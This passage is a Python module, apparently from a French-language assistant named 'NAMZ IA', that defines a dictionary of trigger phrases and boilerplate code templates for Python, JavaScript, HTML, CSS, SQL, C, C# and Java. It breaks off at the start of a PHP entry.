"""
╔══════════════════════════════════════════════════════════════════════════════╗
║                    NAMZ IA - CODE TEMPLATES ULTRA-AVANCÉS                    ║
║                                                                              ║
║  Version: 3.0.0 MEGA Professional Edition                                    ║
║  Templates: 300+                                                             ║
║  Langages: 40+                                                               ║
║  Patterns: Design Patterns, Algorithmes, Architecture, Best Practices       ║
║                                                                              ║
║  📚 Catégories Complètes:                                                    ║
║  • Backend: Python, Node.js, Java, C#, Go, Rust, PHP, Ruby, Elixir         ║
║  • Frontend: React, Vue, Angular, Svelte, TypeScript, Next.js, Nuxt        ║
║  • Mobile: React Native, Flutter, Swift, Kotlin, Xamarin                    ║
║  • Database: SQL, NoSQL, GraphQL, Redis, MongoDB, PostgreSQL               ║
║  • DevOps: Docker, Kubernetes, CI/CD, Terraform, Ansible                   ║
║  • Architecture: Microservices, Event-Driven, CQRS, DDD, Clean Arch        ║
║  • Patterns: 23 Gang of Four + Modern Patterns                              ║
║  • Algorithms: Sorting, Searching, DP, Graphs, Trees, Strings              ║
║  • AI/ML: TensorFlow, PyTorch, Scikit-learn, NLP, Computer Vision          ║
║  • Blockchain: Smart Contracts, Web3, Solidity                              ║
║  • Security: OAuth, JWT, Encryption, OWASP Best Practices                  ║
║  • Testing: Unit, Integration, E2E, Performance, Load Testing              ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
"""

CODE_TEMPLATES = {
    # ===== PYTHON =====
    "python_function": {
        "patterns": ["fonction python", "function python", "écris une fonction python", "def python"],
        "template": "def {name}({args}):\n    \"\"\"\n    Description de la fonction.\n    \n    Args:\n        {args}: Description des paramètres\n        \n    Returns:\n        Type de retour\n    \"\"\"\n    {body}\n    return result\n"
    },
    "python_async_function": {
        "patterns": ["fonction async python", "async function python", "async def"],
        "template": "async def {name}({args}):\n    \"\"\"{body}\"\"\"\n    result = await some_async_operation()\n    return result\n"
    },
    "python_class": {
        "patterns": ["classe python", "class python", "crée une classe python", "dataclass"],
        "template": "class {name}:\n    \"\"\"Classe {name}.\"\"\"\n    \n    def __init__(self, {args}):\n        \"\"\"Initialise {name}.\"\"\"\n        self.args = {args}\n    \n    def __str__(self):\n        return f\"{name}({{self.args}})\"\n    \n    def __repr__(self):\n        return self.__str__()\n"
    },
    "python_dataclass": {
        "patterns": ["dataclass python", "classe données python"],
        "template": "from dataclasses import dataclass\n\n@dataclass\nclass {name}:\n    \"\"\"Dataclass {name}.\"\"\"\n    field1: str\n    field2: int\n    field3: float = 0.0\n"
    },
    "python_decorator": {
        "patterns": ["décorateur python", "decorator python", "@decorator"],
        "template": "def {name}(func):\n    \"\"\"Décorateur {name}.\"\"\"\n    def wrapper(*args, **kwargs):\n        print(f\"Avant l'appel de {{func.__name__}}\")\n        result = func(*args, **kwargs)\n        print(f\"Après l'appel de {{func.__name__}}\")\n        return result\n    return wrapper\n\n@{name}\ndef ma_fonction():\n    print(\"Fonction appelée\")\n"
    },
    "python_context_manager": {
        "patterns": ["context manager python", "gestionnaire contexte python", "with statement"],
        "template": "class {name}:\n    def __enter__(self):\n        print(\"Entrée dans le contexte\")\n        return self\n    \n    def __exit__(self, exc_type, exc_val, exc_tb):\n        print(\"Sortie du contexte\")\n        return False\n\n# Utilisation\nwith {name}() as context:\n    # Code dans le contexte\n    pass\n"
    },
    "python_generator": {
        "patterns": ["générateur python", "generator python", "yield python"],
        "template": "def {name}(n):\n    \"\"\"Générateur qui produit n valeurs.\"\"\"\n    for i in range(n):\n        yield i * 2\n\n# Utilisation\nfor value in {name}(10):\n    print(value)\n"
    },
    "python_list_comprehension": {
        "patterns": ["list comprehension python", "compréhension liste python"],
        "template": "# Liste simple\ncarrés = [x**2 for x in range(10)]\n\n# Avec condition\npairs = [x for x in range(20) if x % 2 == 0]\n\n# Liste imbriquée\nmatrice = [[i*j for j in range(5)] for i in range(5)]\n"
    },
    "python_dict_comprehension": {
        "patterns": ["dict comprehension python", "compréhension dictionnaire python"],
        "template": "# Dictionnaire simple\ncarrés_dict = {x: x**2 for x in range(10)}\n\n# Avec condition\npairs_dict = {x: x**2 for x in range(20) if x % 2 == 0}\n"
    },
    "python_lambda": {
        "patterns": ["lambda python", "fonction anonyme python"],
        "template": "# Lambda simple\nadd = lambda x, y: x + y\n\n# Lambda avec map\ncarrés = list(map(lambda x: x**2, range(10)))\n\n# Lambda avec filter\npairs = list(filter(lambda x: x % 2 == 0, range(20)))\n\n# Lambda avec sorted\ntriés = sorted(data, key=lambda x: x['key'])\n"
    },
    "python_try_except": {
        "patterns": ["try except python", "gestion erreur python", "exception handling"],
        "template": "try:\n    # Code susceptible de lever une exception\n    {body}\nexcept ValueError as e:\n    print(f\"Erreur de valeur: {{e}}\")\nexcept TypeError as e:\n    print(f\"Erreur de type: {{e}}\")\nexcept Exception as e:\n    print(f\"Erreur générale: {{e}}\")\nelse:\n    print(\"Aucune erreur\")\nfinally:\n    print(\"Nettoyage\")\n"
    },
    "python_read_file": {
        "patterns": ["lire fichier python", "read file python", "ouvrir fichier"],
        "template": "# Lecture simple\nwith open('{filename}', 'r', encoding='utf-8') as f:\n    contenu = f.read()\n\n# Lecture ligne par ligne\nwith open('{filename}', 'r', encoding='utf-8') as f:\n    for ligne in f:\n        print(ligne.strip())\n\n# Lecture de toutes les lignes\nwith open('{filename}', 'r', encoding='utf-8') as f:\n    lignes = f.readlines()\n"
    },
    "python_write_file": {
        "patterns": ["écrire fichier python", "write file python", "sauver fichier"],
        "template": "# Écriture simple\nwith open('{filename}', 'w', encoding='utf-8') as f:\n    f.write({content})\n\n# Écriture de plusieurs lignes\nwith open('{filename}', 'w', encoding='utf-8') as f:\n    for ligne in lignes:\n        f.write(ligne + '\\n')\n\n# Ajout à un fichier existant\nwith open('{filename}', 'a', encoding='utf-8') as f:\n    f.write({content})\n"
    },
    "python_json": {
        "patterns": ["json python", "lire json python", "écrire json python"],
        "template": "import json\n\n# Lire JSON\nwith open('{filename}', 'r', encoding='utf-8') as f:\n    data = json.load(f)\n\n# Écrire JSON\nwith open('{filename}', 'w', encoding='utf-8') as f:\n    json.dump(data, f, indent=4, ensure_ascii=False)\n\n# String vers JSON\ndata = json.loads(json_string)\n\n# JSON vers string\njson_string = json.dumps(data, indent=4)\n"
    },
    "python_requests": {
        "patterns": ["requests python", "http request python", "api call python"],
        "template": "import requests\n\n# GET request\nresponse = requests.get('{url}')\nif response.status_code == 200:\n    data = response.json()\n    print(data)\n\n# POST request\nresponse = requests.post('{url}', json={{'key': 'value'}})\n\n# Avec headers\nheaders = {{'Authorization': 'Bearer token'}}\nresponse = requests.get('{url}', headers=headers)\n\n# Avec params\nparams = {{'page': 1, 'limit': 10}}\nresponse = requests.get('{url}', params=params)\n"
    },
    "python_regex": {
        "patterns": ["regex python", "expression régulière python", "re python"],
        "template": "import re\n\n# Recherche simple\nmatch = re.search(r'{pattern}', texte)\nif match:\n    print(match.group())\n\n# Trouver toutes les occurrences\nmatches = re.findall(r'{pattern}', texte)\n\n# Remplacer\nnouveau_texte = re.sub(r'{pattern}', 'remplacement', texte)\n\n# Compiler pour réutilisation\npattern = re.compile(r'{pattern}')\nmatches = pattern.findall(texte)\n"
    },
    "python_datetime": {
        "patterns": ["datetime python", "date python", "time python"],
        "template": "from datetime import datetime, timedelta\n\n# Date actuelle\nmaintenant = datetime.now()\naujourdhui = datetime.today()\n\n# Formater une date\ndate_formatée = maintenant.strftime('%Y-%m-%d %H:%M:%S')\n\n# Parser une date\ndate = datetime.strptime('2025-01-01', '%Y-%m-%d')\n\n# Ajouter du temps\ndemain = maintenant + timedelta(days=1)\ndans_une_heure = maintenant + timedelta(hours=1)\n\n# Différence entre dates\ndifférence = date2 - date1\njours = différence.days\n"
    },
    "python_pathlib": {
        "patterns": ["pathlib python", "path python", "fichier path"],
        "template": "from pathlib import Path\n\n# Créer un chemin\nchemin = Path('{filename}')\n\n# Vérifier existence\nif chemin.exists():\n    print(\"Le fichier existe\")\n\n# Lire un fichier\ncontenu = chemin.read_text(encoding='utf-8')\n\n# Écrire dans un fichier\nchemin.write_text({content}, encoding='utf-8')\n\n# Lister les fichiers\nfor fichier in Path('.').glob('*.py'):\n    print(fichier)\n\n# Créer un dossier\nPath('nouveau_dossier').mkdir(parents=True, exist_ok=True)\n"
    },
    "python_argparse": {
        "patterns": ["argparse python", "arguments ligne commande python", "cli python"],
        "template": "import argparse\n\nparser = argparse.ArgumentParser(description='Description du programme')\nparser.add_argument('fichier', help='Fichier à traiter')\nparser.add_argument('-v', '--verbose', action='store_true', help='Mode verbeux')\nparser.add_argument('-o', '--output', default='output.txt', help='Fichier de sortie')\nparser.add_argument('-n', '--number', type=int, default=10, help='Nombre d\\'itérations')\n\nargs = parser.parse_args()\n\nif args.verbose:\n    print(f\"Traitement de {{args.fichier}}\")\n"
    },
    "python_logging": {
        "patterns": ["logging python", "log python", "logger python"],
        "template": "import logging\n\n# Configuration basique\nlogging.basicConfig(\n    level=logging.DEBUG,\n    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',\n    handlers=[\n        logging.FileHandler('app.log'),\n        logging.StreamHandler()\n    ]\n)\n\nlogger = logging.getLogger(__name__)\n\n# Utilisation\nlogger.debug('Message de debug')\nlogger.info('Message d\\'info')\nlogger.warning('Message d\\'avertissement')\nlogger.error('Message d\\'erreur')\nlogger.critical('Message critique')\n"
    },
    "python_unittest": {
        "patterns": ["unittest python", "test unitaire python", "testing python"],
        "template": "import unittest\n\nclass Test{name}(unittest.TestCase):\n    def setUp(self):\n        \"\"\"Exécuté avant chaque test.\"\"\"\n        self.data = []\n    \n    def tearDown(self):\n        \"\"\"Exécuté après chaque test.\"\"\"\n        pass\n    \n    def test_exemple(self):\n        \"\"\"Test exemple.\"\"\"\n        self.assertEqual(1 + 1, 2)\n        self.assertTrue(True)\n        self.assertFalse(False)\n        self.assertIn('a', 'abc')\n    \n    def test_exception(self):\n        \"\"\"Test d'exception.\"\"\"\n        with self.assertRaises(ValueError):\n            raise ValueError(\"Erreur\")\n\nif __name__ == '__main__':\n    unittest.main()\n"
    },
    
    # ===== JAVASCRIPT / TYPESCRIPT =====
    "js_function": {
        "patterns": ["fonction js", "function js", "javascript function"],
        "template": "function {name}({args}) {{\n    // Description\n    {body}\n    return result;\n}}\n\n// Fonction fléchée\nconst {name}Arrow = ({args}) => {{\n    {body}\n    return result;\n}};\n"
    },
    "js_async_await": {
        "patterns": ["async await js", "async javascript", "promise javascript"],
        "template": "async function {name}({args}) {{\n    try {{\n        const result = await fetch('{url}');\n        const data = await result.json();\n        return data;\n    }} catch (error) {{\n        console.error('Erreur:', error);\n        throw error;\n    }}\n}}\n\n// Utilisation\n{name}().then(data => console.log(data));\n"
    },
    "js_class": {
        "patterns": ["classe js", "class javascript", "es6 class"],
        "template": "class {name} {{\n    constructor({args}) {{\n        this.args = {args};\n    }}\n    \n    methode() {{\n        {body}\n    }}\n    \n    static methodeStatique() {{\n        return 'Méthode statique';\n    }}\n    \n    get propriete() {{\n        return this.args;\n    }}\n    \n    set propriete(value) {{\n        this.args = value;\n    }}\n}}\n\nconst instance = new {name}({args});\n"
    },
    "js_promise": {
        "patterns": ["promise javascript", "promesse js", "then catch js"],
        "template": "const {name} = new Promise((resolve, reject) => {{\n    // Opération asynchrone\n    if (success) {{\n        resolve(result);\n    }} else {{\n        reject(new Error('Erreur'));\n    }}\n}});\n\n// Utilisation\n{name}\n    .then(result => console.log(result))\n    .catch(error => console.error(error))\n    .finally(() => console.log('Terminé'));\n"
    },
    "js_fetch": {
        "patterns": ["fetch js", "api call js", "http request javascript"],
        "template": "// GET request\nfetch('{url}')\n    .then(response => {{\n        if (!response.ok) throw new Error('Erreur HTTP');\n        return response.json();\n    }})\n    .then(data => console.log(data))\n    .catch(error => console.error('Erreur:', error));\n\n// POST request\nfetch('{url}', {{\n    method: 'POST',\n    headers: {{\n        'Content-Type': 'application/json',\n    }},\n    body: JSON.stringify({{key: 'value'}})\n}})\n    .then(response => response.json())\n    .then(data => console.log(data));\n"
    },
    "js_array_methods": {
        "patterns": ["array methods js", "méthodes tableau javascript", "map filter reduce"],
        "template": "const arr = [1, 2, 3, 4, 5];\n\n// map - transformer\nconst doubled = arr.map(x => x * 2);\n\n// filter - filtrer\nconst evens = arr.filter(x => x % 2 === 0);\n\n// reduce - réduire\nconst sum = arr.reduce((acc, x) => acc + x, 0);\n\n// find - trouver un élément\nconst found = arr.find(x => x > 3);\n\n// some - vérifier si au moins un\nconst hasEven = arr.some(x => x % 2 === 0);\n\n// every - vérifier si tous\nconst allPositive = arr.every(x => x > 0);\n\n// forEach - itérer\narr.forEach(x => console.log(x));\n"
    },
    "js_destructuring": {
        "patterns": ["destructuring js", "déstructuration javascript", "spread operator"],
        "template": "// Déstructuration d'objet\nconst {{name, age}} = person;\n\n// Déstructuration de tableau\nconst [first, second, ...rest] = array;\n\n// Spread operator - objet\nconst newObj = {{...oldObj, newProp: 'value'}};\n\n// Spread operator - tableau\nconst newArr = [...oldArr, 4, 5, 6];\n\n// Rest parameters\nfunction sum(...numbers) {{\n    return numbers.reduce((a, b) => a + b, 0);\n}}\n"
    },
    "js_modules": {
        "patterns": ["modules javascript", "import export js", "es6 modules"],
        "template": "// Export\nexport const {name} = 'value';\nexport function fonction() {{}}\nexport class Classe {{}}\nexport default {{name, fonction, Classe}};\n\n// Import\nimport {{name, fonction}} from './module.js';\nimport * as Module from './module.js';\nimport defaultExport from './module.js';\nimport {{name as alias}} from './module.js';\n"
    },
    "js_event_listener": {
        "patterns": ["event listener js", "événement javascript", "addEventListener"],
        "template": "// Ajouter un écouteur\nelement.addEventListener('click', (event) => {{\n    console.log('Cliqué!', event);\n}});\n\n// Supprimer un écouteur\nconst handler = (event) => console.log(event);\nelement.addEventListener('click', handler);\nelement.removeEventListener('click', handler);\n\n// Options avancées\nelement.addEventListener('click', handler, {{\n    once: true,      // Appelé une seule fois\n    passive: true,   // N'appellera pas preventDefault\n    capture: false   // Phase de capture\n}});\n"
    },
    "js_localstorage": {
        "patterns": ["localstorage javascript", "storage js", "session storage"],
        "template": "// Sauvegarder\nlocalStorage.setItem('key', 'value');\nlocalStorage.setItem('user', JSON.stringify({{name: 'John'}}));\n\n// Récupérer\nconst value = localStorage.getItem('key');\nconst user = JSON.parse(localStorage.getItem('user'));\n\n// Supprimer\nlocalStorage.removeItem('key');\n\n// Tout supprimer\nlocalStorage.clear();\n\n// Session Storage (même API)\nsessionStorage.setItem('key', 'value');\n"
    },
    
    # ===== HTML =====
    "html_boilerplate": {
        "patterns": ["html boilerplate", "html de base", "structure html", "html5"],
        "template": "<!DOCTYPE html>\n<html lang='fr'>\n<head>\n    <meta charset='UTF-8'>\n    <meta name='viewport' content='width=device-width, initial-scale=1.0'>\n    <meta http-equiv='X-UA-Compatible' content='ie=edge'>\n    <title>{title}</title>\n    <link rel='stylesheet' href='style.css'>\n</head>\n<body>\n    <header>\n        <h1>Titre</h1>\n        <nav>\n            <ul>\n                <li><a href='#'>Accueil</a></li>\n                <li><a href='#'>À propos</a></li>\n                <li><a href='#'>Contact</a></li>\n            </ul>\n        </nav>\n    </header>\n    \n    <main>\n        {body}\n    </main>\n    \n    <footer>\n        <p>&copy; 2025 Tous droits réservés</p>\n    </footer>\n    \n    <script src='script.js'></script>\n</body>\n</html>\n"
    },
    "html_form": {
        "patterns": ["formulaire html", "html form", "form html"],
        "template": "<form action='/submit' method='POST'>\n    <div class='form-group'>\n        <label for='name'>Nom:</label>\n        <input type='text' id='name' name='name' required>\n    </div>\n    \n    <div class='form-group'>\n        <label for='email'>Email:</label>\n        <input type='email' id='email' name='email' required>\n    </div>\n    \n    <div class='form-group'>\n        <label for='message'>Message:</label>\n        <textarea id='message' name='message' rows='5' required></textarea>\n    </div>\n    \n    <div class='form-group'>\n        <label for='country'>Pays:</label>\n        <select id='country' name='country'>\n            <option value='fr'>France</option>\n            <option value='be'>Belgique</option>\n            <option value='ch'>Suisse</option>\n        </select>\n    </div>\n    \n    <div class='form-group'>\n        <label>\n            <input type='checkbox' name='newsletter'>\n            S'inscrire à la newsletter\n        </label>\n    </div>\n    \n    <button type='submit'>Envoyer</button>\n</form>\n"
    },
    "html_table": {
        "patterns": ["tableau html", "html table", "table html"],
        "template": "<table>\n    <thead>\n        <tr>\n            <th>Colonne 1</th>\n            <th>Colonne 2</th>\n            <th>Colonne 3</th>\n        </tr>\n    </thead>\n    <tbody>\n        <tr>\n            <td>Donnée 1</td>\n            <td>Donnée 2</td>\n            <td>Donnée 3</td>\n        </tr>\n        <tr>\n            <td>Donnée 4</td>\n            <td>Donnée 5</td>\n            <td>Donnée 6</td>\n        </tr>\n    </tbody>\n    <tfoot>\n        <tr>\n            <td colspan='3'>Total</td>\n        </tr>\n    </tfoot>\n</table>\n"
    },
    "html_semantic": {
        "patterns": ["html sémantique", "semantic html", "html5 semantic"],
        "template": "<!DOCTYPE html>\n<html lang='fr'>\n<body>\n    <header>\n        <nav>Navigation</nav>\n    </header>\n    \n    <main>\n        <article>\n            <header>\n                <h1>Titre de l'article</h1>\n                <time datetime='2025-01-01'>1er janvier 2025</time>\n            </header>\n            \n            <section>\n                <h2>Section 1</h2>\n                <p>Contenu...</p>\n            </section>\n            \n            <aside>\n                <h3>Info complémentaire</h3>\n            </aside>\n            \n            <footer>\n                <p>Auteur: John Doe</p>\n            </footer>\n        </article>\n    </main>\n    \n    <footer>\n        <p>&copy; 2025</p>\n    </footer>\n</body>\n</html>\n"
    },
    
    # ===== CSS =====
    "css_flexbox": {
        "patterns": ["flexbox css", "flex css", "display flex"],
        "template": ".container {{\n    display: flex;\n    \n    /* Direction */\n    flex-direction: row; /* row, column, row-reverse, column-reverse */\n    \n    /* Alignement horizontal */\n    justify-content: center; /* flex-start, flex-end, center, space-between, space-around, space-evenly */\n    \n    /* Alignement vertical */\n    align-items: center; /* flex-start, flex-end, center, stretch, baseline */\n    \n    /* Retour à la ligne */\n    flex-wrap: wrap; /* nowrap, wrap, wrap-reverse */\n    \n    /* Gap entre éléments */\n    gap: 1rem;\n}}\n\n.item {{\n    flex: 1; /* flex-grow flex-shrink flex-basis */\n    flex-basis: 200px;\n    flex-grow: 1;\n    flex-shrink: 0;\n}}\n"
    },
    "css_grid": {
        "patterns": ["css grid", "grid layout", "display grid"],
        "template": ".container {{\n    display: grid;\n    \n    /* Colonnes */\n    grid-template-columns: repeat(3, 1fr); /* 3 colonnes égales */\n    grid-template-columns: 200px 1fr 200px; /* colonnes fixes et flexibles */\n    \n    /* Lignes */\n    grid-template-rows: auto 1fr auto;\n    \n    /* Gap */\n    gap: 1rem;\n    grid-gap: 1rem; /* ancien */\n    \n    /* Areas */\n    grid-template-areas:\n        'header header header'\n        'sidebar main main'\n        'footer footer footer';\n}}\n\n.item {{\n    grid-column: 1 / 3; /* Span 2 colonnes */\n    grid-row: 1 / 2;\n    grid-area: header;\n}}\n"
    },
    "css_animations": {
        "patterns": ["animation css", "keyframes css", "transition css"],
        "template": "/* Transitions */\n.element {{\n    transition: all 0.3s ease-in-out;\n    transition-property: opacity, transform;\n    transition-duration: 0.3s;\n    transition-timing-function: ease;\n    transition-delay: 0.1s;\n}}\n\n.element:hover {{\n    opacity: 0.8;\n    transform: scale(1.1);\n}}\n\n/* Animations */\n@keyframes fadeIn {{\n    from {{\n        opacity: 0;\n        transform: translateY(20px);\n    }}\n    to {{\n        opacity: 1;\n        transform: translateY(0);\n    }}\n}}\n\n.animated {{\n    animation: fadeIn 0.5s ease-out;\n    animation-name: fadeIn;\n    animation-duration: 0.5s;\n    animation-timing-function: ease-out;\n    animation-delay: 0s;\n    animation-iteration-count: 1; /* ou infinite */\n    animation-direction: normal; /* alternate, reverse */\n    animation-fill-mode: forwards; /* backwards, both */\n}}\n"
    },
    "css_responsive": {
        "patterns": ["css responsive", "media queries css", "responsive design"],
        "template": "/* Mobile First */\n.container {{\n    width: 100%;\n    padding: 1rem;\n}}\n\n/* Tablet */\n@media (min-width: 768px) {{\n    .container {{\n        width: 750px;\n        margin: 0 auto;\n    }}\n}}\n\n/* Desktop */\n@media (min-width: 1024px) {{\n    .container {{\n        width: 960px;\n    }}\n}}\n\n/* Large Desktop */\n@media (min-width: 1280px) {{\n    .container {{\n        width: 1200px;\n    }}\n}}\n\n/* Dark mode */\n@media (prefers-color-scheme: dark) {{\n    body {{\n        background: #1a1a1a;\n        color: #ffffff;\n    }}\n}}\n"
    },
    "css_variables": {
        "patterns": ["css variables", "custom properties css", "var css"],
        "template": ":root {{\n    /* Couleurs */\n    --primary-color: #3498db;\n    --secondary-color: #2ecc71;\n    --text-color: #333;\n    --bg-color: #fff;\n    \n    /* Espacements */\n    --spacing-sm: 0.5rem;\n    --spacing-md: 1rem;\n    --spacing-lg: 2rem;\n    \n    /* Typographie */\n    --font-family: 'Arial', sans-serif;\n    --font-size-base: 16px;\n    --line-height: 1.6;\n}}\n\n/* Utilisation */\n.element {{\n    color: var(--primary-color);\n    background: var(--bg-color, #fff); /* avec fallback */\n    padding: var(--spacing-md);\n    font-family: var(--font-family);\n}}\n\n/* Dark mode avec variables */\n[data-theme='dark'] {{\n    --text-color: #fff;\n    --bg-color: #1a1a1a;\n}}\n"
    },
    
    # ===== SQL =====
    "sql_select": {
        "patterns": ["select sql", "requête select", "sql query"],
        "template": "-- SELECT simple\nSELECT * FROM {table};\n\n-- SELECT avec colonnes spécifiques\nSELECT id, nom, email FROM users;\n\n-- SELECT avec WHERE\nSELECT * FROM {table} WHERE {colonne} = '{valeur}';\n\n-- SELECT avec ORDER BY\nSELECT * FROM {table} ORDER BY {colonne} DESC;\n\n-- SELECT avec LIMIT\nSELECT * FROM {table} LIMIT 10 OFFSET 20;\n\n-- SELECT avec JOIN\nSELECT u.nom, o.montant\nFROM users u\nINNER JOIN orders o ON u.id = o.user_id;\n\n-- SELECT avec GROUP BY\nSELECT category, COUNT(*) as total\nFROM products\nGROUP BY category\nHAVING COUNT(*) > 5;\n"
    },
    "sql_insert": {
        "patterns": ["insert sql", "insérer sql", "insert into"],
        "template": "-- INSERT simple\nINSERT INTO {table} ({colonnes})\nVALUES ({valeurs});\n\n-- INSERT multiple\nINSERT INTO users (nom, email, age)\nVALUES \n    ('John', 'john@email.com', 30),\n    ('Jane', 'jane@email.com', 25);\n\n-- INSERT avec SELECT\nINSERT INTO archive_users\nSELECT * FROM users WHERE created_at < '2020-01-01';\n"
    },
    "sql_update": {
        "patterns": ["update sql", "modifier sql", "update table"],
        "template": "-- UPDATE simple\nUPDATE {table}\nSET {colonne} = '{valeur}'\nWHERE id = 1;\n\n-- UPDATE multiple colonnes\nUPDATE users\nSET nom = 'John Doe',\n    email = 'john@email.com',\n    updated_at = NOW()\nWHERE id = 1;\n\n-- UPDATE avec sous-requête\nUPDATE products\nSET price = price * 1.1\nWHERE category_id IN (SELECT id FROM categories WHERE name = 'Electronics');\n"
    },
    "sql_delete": {
        "patterns": ["delete sql", "supprimer sql", "delete from"],
        "template": "-- DELETE simple\nDELETE FROM {table}\nWHERE id = 1;\n\n-- DELETE avec condition\nDELETE FROM users\nWHERE created_at < '2020-01-01';\n\n-- DELETE avec JOIN\nDELETE u\nFROM users u\nINNER JOIN inactive_users i ON u.id = i.user_id;\n\n-- Vider une table (plus rapide)\nTRUNCATE TABLE {table};\n"
    },
    "sql_create_table": {
        "patterns": ["create table sql", "créer table sql", "table sql"],
        "template": "-- Créer une table\nCREATE TABLE {table} (\n    id INT PRIMARY KEY AUTO_INCREMENT,\n    nom VARCHAR(100) NOT NULL,\n    email VARCHAR(255) UNIQUE NOT NULL,\n    age INT CHECK (age >= 18),\n    created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,\n    updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,\n    \n    -- Clé étrangère\n    user_id INT,\n    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE\n);\n\n-- Créer un index\nCREATE INDEX idx_email ON users(email);\n\n-- Créer une table temporaire\nCREATE TEMPORARY TABLE temp_users AS\nSELECT * FROM users WHERE active = 1;\n"
    },
    
    # ===== C =====
    "c_function": {
        "patterns": ["fonction c", "function c", "c function"],
        "template": "/**\n * Description de la fonction\n * @param {args} Description des paramètres\n * @return Description du retour\n */\nint {name}({args}) {{\n    {body}\n    return 0;\n}}\n"
    },
    "c_struct": {
        "patterns": ["struct c", "structure c", "typedef struct"],
        "template": "typedef struct {{\n    int id;\n    char nom[50];\n    float valeur;\n}} {name};\n\n// Initialisation\n{name} instance = {{1, \"Example\", 3.14}};\n\n// Accès aux membres\ninstance.id = 2;\nstrcpy(instance.nom, \"Nouveau\");\n"
    },
    "c_pointers": {
        "patterns": ["pointeur c", "pointer c", "c pointers"],
        "template": "// Déclaration de pointeur\nint *ptr;\nint valeur = 42;\nptr = &valeur;\n\n// Déréférencement\nprintf(\"Valeur: %d\\n\", *ptr);\n\n// Pointeur de pointeur\nint **ptr2 = &ptr;\n\n// Allocation dynamique\nint *arr = (int*)malloc(10 * sizeof(int));\nif (arr == NULL) {{\n    fprintf(stderr, \"Erreur d'allocation\\n\");\n    return 1;\n}}\n\n// Libération\nfree(arr);\n"
    },
    "c_file_io": {
        "patterns": ["fichier c", "file c", "fopen c"],
        "template": "#include <stdio.h>\n\n// Lire un fichier\nFILE *file = fopen(\"{filename}\", \"r\");\nif (file == NULL) {{\n    perror(\"Erreur d'ouverture\");\n    return 1;\n}}\n\nchar buffer[256];\nwhile (fgets(buffer, sizeof(buffer), file) != NULL) {{\n    printf(\"%s\", buffer);\n}}\n\nfclose(file);\n\n// Écrire dans un fichier\nfile = fopen(\"{filename}\", \"w\");\nif (file != NULL) {{\n    fprintf(file, \"Ligne 1\\n\");\n    fputs(\"Ligne 2\\n\", file);\n    fclose(file);\n}}\n"
    },
    
    # ===== C# =====
    "csharp_class": {
        "patterns": ["classe c#", "class c#", "csharp class"],
        "template": "/// <summary>\n/// Description de la classe\n/// </summary>\npublic class {name}\n{{\n    // Propriétés\n    public int Id {{ get; set; }}\n    public string Nom {{ get; set; }}\n    \n    // Constructeur\n    public {name}(int id, string nom)\n    {{\n        Id = id;\n        Nom = nom;\n    }}\n    \n    // Méthode\n    public void Methode()\n    {{\n        {body}\n    }}\n    \n    // Override ToString\n    public override string ToString()\n    {{\n        return $\"{name}({{Id}}, {{Nom}})\";\n    }}\n}}\n"
    },
    "csharp_linq": {
        "patterns": ["linq c#", "csharp linq", "query linq"],
        "template": "using System.Linq;\n\nvar numbers = new[] {{ 1, 2, 3, 4, 5 }};\n\n// Query syntax\nvar query = from n in numbers\n            where n % 2 == 0\n            select n * 2;\n\n// Method syntax\nvar result = numbers\n    .Where(n => n % 2 == 0)\n    .Select(n => n * 2)\n    .OrderBy(n => n)\n    .ToList();\n\n// Agrégation\nvar sum = numbers.Sum();\nvar avg = numbers.Average();\nvar max = numbers.Max();\nvar count = numbers.Count(n => n > 2);\n\n// GroupBy\nvar grouped = items\n    .GroupBy(x => x.Category)\n    .Select(g => new {{ Category = g.Key, Count = g.Count() }});\n"
    },
    "csharp_async": {
        "patterns": ["async c#", "async await c#", "task c#"],
        "template": "using System.Threading.Tasks;\n\npublic async Task<string> {name}Async()\n{{\n    // Opération asynchrone\n    await Task.Delay(1000);\n    \n    var result = await GetDataAsync();\n    return result;\n}}\n\n// Appel\npublic async Task ExecuteAsync()\n{{\n    try\n    {{\n        var result = await {name}Async();\n        Console.WriteLine(result);\n    }}\n    catch (Exception ex)\n    {{\n        Console.WriteLine($\"Erreur: {{ex.Message}}\");\n    }}\n}}\n"
    },
    
    # ===== JAVA =====
    "java_class": {
        "patterns": ["classe java", "class java", "java class"],
        "template": "/**\n * Description de la classe\n */\npublic class {name} {{\n    // Attributs\n    private int id;\n    private String nom;\n    \n    // Constructeur\n    public {name}(int id, String nom) {{\n        this.id = id;\n        this.nom = nom;\n    }}\n    \n    // Getters\n    public int getId() {{\n        return id;\n    }}\n    \n    public String getNom() {{\n        return nom;\n    }}\n    \n    // Setters\n    public void setId(int id) {{\n        this.id = id;\n    }}\n    \n    public void setNom(String nom) {{\n        this.nom = nom;\n    }}\n    \n    // toString\n    @Override\n    public String toString() {{\n        return \"{name}{{\" +\n                \"id=\" + id +\n                \", nom='\" + nom + '\\'' +\n                '}}';\n    }}\n}}\n"
    },
    "java_interface": {
        "patterns": ["interface java", "java interface"],
        "template": "/**\n * Description de l'interface\n */\npublic interface {name} {{\n    // Constantes\n    int CONSTANTE = 100;\n    \n    // Méthodes abstraites\n    void methode1();\n    String methode2(int param);\n    \n    // Méthode par défaut (Java 8+)\n    default void methodeParDefaut() {{\n        System.out.println(\"Implémentation par défaut\");\n    }}\n    \n    // Méthode statique (Java 8+)\n    static void methodeStatique() {{\n        System.out.println(\"Méthode statique\");\n    }}\n}}\n"
    },
    "java_stream": {
        "patterns": ["stream java", "java stream", "java 8 stream"],
        "template": "import java.util.stream.*;\nimport java.util.*;\n\nList<Integer> numbers = Arrays.asList(1, 2, 3, 4, 5);\n\n// Filter et Map\nList<Integer> result = numbers.stream()\n    .filter(n -> n % 2 == 0)\n    .map(n -> n * 2)\n    .collect(Collectors.toList());\n\n// Reduce\nint sum = numbers.stream()\n    .reduce(0, (a, b) -> a + b);\n\n// GroupBy\nMap<Boolean, List<Integer>> partitioned = numbers.stream()\n    .collect(Collectors.partitioningBy(n -> n % 2 == 0));\n\n// Sorted\nList<String> sorted = items.stream()\n    .sorted(Comparator.comparing(Item::getName))\n    .collect(Collectors.toList());\n"
    },
    
    # ===== PHP =====
    "php_function": {
        "patterns": ["fonction php", "function php", "php function"],
